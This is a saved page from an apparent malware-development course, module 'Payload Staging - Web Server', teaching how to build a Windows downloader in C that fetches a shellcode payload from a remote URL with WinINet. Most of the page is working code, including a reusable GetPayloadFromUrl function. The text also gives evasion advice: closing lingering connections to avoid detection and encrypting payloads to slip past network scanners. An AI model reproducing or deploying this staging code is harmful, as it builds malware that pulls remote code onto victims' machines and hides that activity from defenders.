<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Payload%20Staging%20-%20Web%20Server_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Payload%20Staging%20-%20Web%20Server_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Payload%20Staging%20-%20Web%20Server_files/css2_002.css" rel="stylesheet">
        <link href="Payload%20Staging%20-%20Web%20Server_files/css2.css" rel="stylesheet">
        <title>Payload Staging - Web Server</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Payload%20Staging%20-%20Web%20Server_files/app.fdbb573b.css"><link rel="stylesheet" href="Payload%20Staging%20-%20Web%20Server_files/app.fdbb573b.css"><link rel="stylesheet" href="Payload%20Staging%20-%20Web%20Server_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Payload%20Staging%20-%20Web%20Server_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 30 - Payload Staging - Web Server
            </div>
            <div class="ml-2 w-4 h-4 bg-green-800 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Payload%20Staging%20-%20Web%20Server_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Payload%20Staging%20-%20Web%20Server_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Payload%20Staging%20-%20Web%20Server_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/WebStaging" target="_blank">
                    <img src="Payload%20Staging%20-%20Web%20Server_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Payload Staging - Web Server</h2>
<h3>Introduction</h3>
<p>Throughout the modules thus far, the payload has been consistently 
stored directly within the binary. This is a fast and commonly used 
method to fetch the payload. Unfortunately, in some cases where payload 
size constraints exist, saving the payload inside the code is not a 
feasible approach. The alternative approach is to host the payload on a 
web server and fetch it during execution.</p>
<h3>Setting Up The Web Server</h3>
<p>This module requires a web server to host the payload file. The easiest way is to use <a href="https://docs.python.org/3/library/http.server.html" target="_blank">Python's HTTP server</a> using the following command:</p>
<p><code>python -m http.server 8000</code></p>
<p>Note that the payload file should be hosted in the same directory where this command is executed.</p>
<p><img src="Payload%20Staging%20-%20Web%20Server_files/python-http-server.png" alt="image"></p>
<br>
<p>To verify the web server is working, head to <a href="http://127.0.0.1:8000/" target="_blank">http://127.0.0.1:8000</a> using the browser.</p>
<p><img src="Payload%20Staging%20-%20Web%20Server_files/python-http-server-2.png" alt="image"></p>
<h3>Fetching The Payload</h3>
<p>To fetch the payload from the web server, the following Windows APIs will be used:</p>
<ul>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw" target="_blank">InternetOpenW</a> - Opens an internet session handle which is a prerequisite to using the other Internet Windows APIs</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw" target="_blank">InternetOpenUrlW</a> - Open a handle to the specified resource which is the payload's URL.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile" target="_blank">InternetReadFile</a> - Reads data from the web resource handle. This is the handle opened by <code>InternetOpenUrlW</code>.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle" target="_blank">InternetCloseHandle</a> - Closes the handle.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw" target="_blank">InternetSetOptionW</a> - Sets an Internet option.</p>
</li>
</ul>
<h3>Opening An Internet Session</h3>
<p>The first step is to open an internet session handle using <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw" target="_blank">InternetOpenW</a> which initializes an application's use of the WinINet functions. All the parameters being passed to the WinAPI are <code>NULL</code> since they are mainly for proxy-related matters. It is worth noting that having the second parameter set to <code>NULL</code> is equivalent to using <code>INTERNET_OPEN_TYPE_PRECONFIG</code>,
 which specifies that the system's current configuration should be used 
to determine the proxy settings for the Internet connection.</p>
<pre><code>HINTERNET InternetOpenW(
  [in] LPCWSTR lpszAgent,       // NULL
  [in] DWORD   dwAccessType,    // NULL or INTERNET_OPEN_TYPE_PRECONFIG
  [in] LPCWSTR lpszProxy,       // NULL
  [in] LPCWSTR lpszProxyBypass, // NULL
  [in] DWORD   dwFlags          // NULL
);
</code></pre>
<p>Calling the function is shown in the snippet below.</p>
<pre><code>// Opening an internet session handle
hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
</code></pre>
<h3>Opening a Handle To Payload</h3>
<p>Moving on to the next WinAPI used, <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw" target="_blank">InternetOpenUrlW</a>, where a connection is being established to the payloads's URL.</p>
<pre><code>HINTERNET InternetOpenUrlW(
  [in] HINTERNET hInternet,       // Handle opened by InternetOpenW
  [in] LPCWSTR   lpszUrl,         // The payload's URL
  [in] LPCWSTR   lpszHeaders,     // NULL
  [in] DWORD     dwHeadersLength, // NULL
  [in] DWORD     dwFlags,         // INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
  [in] DWORD_PTR dwContext        // NULL
);
</code></pre>
<p>Calling the function is shown in the snippet below. The fifth parameter of the function uses <code>INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</code>
 to achieve a higher success rate with the HTTP request in case of an 
error on the server side. It's possible to use additional flags such as <code>INTERNET_FLAG_IGNORE_CERT_CN_INVALID</code> but that will be left up to the reader. The flags are well explained in Microsoft's <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw" target="_blank">documentation</a>.</p>
<pre><code>// Opening a handle to the payload's URL
hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
</code></pre>
<h3>Reading Data</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile" target="_blank">InternetReadFile</a> is the next WinAPI used which will read the payload.</p>
<pre><code>BOOL InternetReadFile(
  [in]  HINTERNET hFile,                  // Handle opened by InternetOpenUrlW
  [out] LPVOID    lpBuffer,               // Buffer to store the payload
  [in]  DWORD     dwNumberOfBytesToRead,  // The number of bytes to read
  [out] LPDWORD   lpdwNumberOfBytesRead   // Pointer to a variable that receives the number of bytes read
);
</code></pre>
<p>Before calling the function, a buffer must be allocated to hold the payload. Therefore, <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localalloc" target="_blank">LocalAlloc</a> is used to allocate a buffer the same size as the payload, 272 bytes. Once the buffer has been allocated, <code>InternetReadFile</code> can be used to read the payload. The function requires the number of bytes to read which in this case is <code>272</code>.</p>
<pre><code>pBytes = (PBYTE)LocalAlloc(LPTR, 272);
InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)
</code></pre>
<h3>Closing InterntHandle</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle" target="_blank">InternetCloseHandle</a> is used to close an internet handle. This should be called once the payload has been successfully fetched.</p>
<pre><code>BOOL InternetCloseHandle(
  [in] HINTERNET hInternet // Handle opened by InternetOpenW &amp; InternetOpenUrlW
);
</code></pre>
<h3>Closing HTTP/S Connections</h3>
<p>It's important to be aware that the <code>InternetCloseHandle</code> 
WinAPI does not close the HTTP/S connection. WinInet tries to reuse 
connections and therefore although the handle was closed, the connection
 remains active. Closing the connection is vital to lessen the 
possibility of detection. For example, a binary was created that fetches
 a payload from GitHub. The image below shows the binary still connected
 to GitHub although the binary's execution was completed.</p>
<p><img src="Payload%20Staging%20-%20Web%20Server_files/staging-github.png" alt="image"></p>
<p>Luckily, the solution is quite simple. All that is required is to tell WinInet to close all the connections using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw" target="_blank">InternetSetOptionW</a> WinAPI.</p>
<pre><code>BOOL InternetSetOptionW(
  [in] HINTERNET hInternet,     // NULL
  [in] DWORD     dwOption,      // INTERNET_OPTION_SETTINGS_CHANGED
  [in] LPVOID    lpBuffer,      // NULL
  [in] DWORD     dwBufferLength // 0
);
</code></pre>
<p>Calling <code>InternetSetOptionW</code> with the <code>INTERNET_OPTION_SETTINGS_CHANGED</code>
 flag will cause the system to update the cached version of its internet
 settings and thus resulting in the connections saved by WinInet being 
closed.</p>
<pre><code>InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
</code></pre>
<h3>Payload Staging - Code Snippet</h3>
<p><code>GetPayloadFromUrl</code> is a function that uses the previously discussed steps to fetch the payload from a remote server and stores it in a buffer.</p>
<pre><code>BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;
	
	PBYTE		pBytes                 = NULL;

	DWORD		dwBytesRead            = NULL;

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocating a buffer for the payload
	pBytes = (PBYTE)LocalAlloc(LPTR, 272);

	// Reading the payload
	if (!InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)) {
		printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}

</code></pre>
<h3>Dynamic Payload Size Allocation</h3>
<p>The above implementation works when the payload size is known. When 
the size is unknown or is larger than the number of bytes specified in <code>InternetReadFile</code>, a heap overflow will occur resulting in the binary crashing.</p>
<p>One way to solve this issue is by placing <code>InternetReadFile</code> inside a while loop and continuously reading a constant value of bytes, which for this example will be <code>1024</code> bytes. The bytes are stored directly in a temporary buffer which will be of the same size, <code>1024</code>. The temporary buffer will be appended to the total bytes buffer which will continuously be reallocated to fit each newly read <code>1024</code> byte chunk. Once <code>InternetReadFile</code> reads a value that is less than <code>1024</code> then that's the indicator that it has reached the end of the file and will break out of the loop.</p>
<h3>Payload Staging With Dynamic Allocation - Code Snippet</h3>
<pre><code>BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;
	
	DWORD		dwBytesRead            = NULL;
  
	SIZE_T		sSize                   = NULL; // Used as the total payload size
	
	PBYTE		pBytes                  = NULL; // Used as the total payload heap buffer
	PBYTE		pTmpBytes               = NULL; // Used as the temp buffer of size 1024 bytes

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		return FALSE;
	}

	while (TRUE) {

		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// Updating the size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			return FALSE;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer 
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead &lt; 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}

	// Clean up
	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);

	return TRUE;
}

</code></pre>
<h3>Payload Staging Final - Code Snippet</h3>
<p>The <code>GetPayloadFromUrl</code> function now takes 3 parameters:</p>
<ul>
<li>
<p><code>szUrl</code>- The URL of the payload.</p>
</li>
<li>
<p><code>pPayloadBytes</code> - Returns as the base address of the buffer containing the payload.</p>
</li>
<li>
<p><code>sPayloadSize</code> - The total size of the payload that was read.</p>
</li>
</ul>
<p>The function will also correctly closes the HTTP/S connections once the retrieval of the payload has been completed.</p>
<pre><code>BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = NULL;
	
	SIZE_T		sSize             = NULL;
	PBYTE		pBytes            = NULL,
			    pTmpByte          = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL){
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL){
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL){
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead &lt; 1024){
			break;
		}
	}
	


	*pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}
</code></pre>
<h4>Implementation Note</h4>
<p>In this module, the payload was retrieved from the internet as raw 
binary data, without any encryption or obfuscation. While this approach 
may evade basic security measures that analyze the binary code for signs
 of malicious activity, it'll get flagged by network scanning tools. 
Therefore, if the payload is not encrypted, packets captured during the 
transmission may contain identifiable snippets of the payload. This 
could expose the payload's signature, leading to the implementation 
process being flagged.</p>
<p>In real-world scenarios, it is always advised to encrypt or obfuscate the payload even if it's fetched at runtime.</p>
<h3>Running The Final Binary</h3>
<p>The binary successfully fetches the payload.</p>
<p><img src="Payload%20Staging%20-%20Web%20Server_files/staging-demo-1.png" alt="image"></p>
<p>The connections are closed once execution is completed.</p>
<p><img src="Payload%20Staging%20-%20Web%20Server_files/staging-demo-2.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Setup a local HTTP server that contains your payload</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Compile and run the provided code to fetch the payload from your local HTTP server and execute it</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/29"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/30/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/30/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/31"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Payload%20Staging%20-%20Web%20Server_files/jquery-3.6.0.min.js"></script>
        <script src="Payload%20Staging%20-%20Web%20Server_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Payload%20Staging%20-%20Web%20Server_files/app.4474f4d1.css"><link rel="modulepreload" href="Payload%20Staging%20-%20Web%20Server_files/app.5f3af5ce.js"><link rel="stylesheet" href="Payload%20Staging%20-%20Web%20Server_files/app.4474f4d1.css"><script type="module" src="Payload%20Staging%20-%20Web%20Server_files/app.5f3af5ce.js"></script><script src="Payload%20Staging%20-%20Web%20Server_files/navbar.js"></script>
<script src="Payload%20Staging%20-%20Web%20Server_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 30;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>